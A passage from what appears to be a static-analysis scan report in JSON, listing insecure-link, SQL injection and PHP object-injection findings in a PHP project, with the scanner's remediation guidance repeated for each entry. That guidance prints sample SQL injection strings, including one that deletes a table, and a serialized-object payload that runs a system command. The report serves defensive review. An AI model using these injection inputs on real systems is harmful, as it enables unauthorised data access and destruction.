http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4525/?engineType=SCA&issue=66F75F09667E4CFD81A05444FF43103E"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4526",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Monitor.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4526/?engineType=SCA&issue=66F75F09667E4CFD81A05444FF43103F"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4451",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Report.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4451/?engineType=SCA&issue=39FB676B0CACF3EE2F4627CA45FF531E"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4452",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Report.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4452/?engineType=SCA&issue=39FB676B0CACF3EE2F4627CA45FF531F"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4453",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Report.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4453/?engineType=SCA&issue=39FB676B0CACF3EE2F4627CA45FF5320"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4362",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file blank.html on line 11 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4362/?engineType=SCA&issue=00002CEFEB3E732E302A16BE56A3BC55"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4398",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file classtrees_PHPIDS.html on line 89 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4398/?engineType=SCA&issue=18D4D720BFF98E28674A935DD5185126"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4405",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file errors.html on line 1430 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4405/?engineType=SCA&issue=1B4AE331EFAC6FA1AECBB564B8116683"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4653",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file li_PHPIDS.html on line 67 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4653/?engineType=SCA&issue=BEC510FD15E3039AB1B3F6F675ACD163"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4427",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 151 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4427/?engineType=SCA&issue=283F62F095B86F3A57C56A26658359AD"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4513",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 186 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4513/?engineType=SCA&issue=5F91D7A3BABA220DE15BC95CC8B7E2C5"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4588",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 192 in Database.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4588/?engineType=SCA&issue=90385E636C7B1AEF4E03C1A3EB68638C"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4472",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 248 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4472/?engineType=SCA&issue=474D5AE95B853E1A2B93D839E577B2C5"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4663",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 250 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
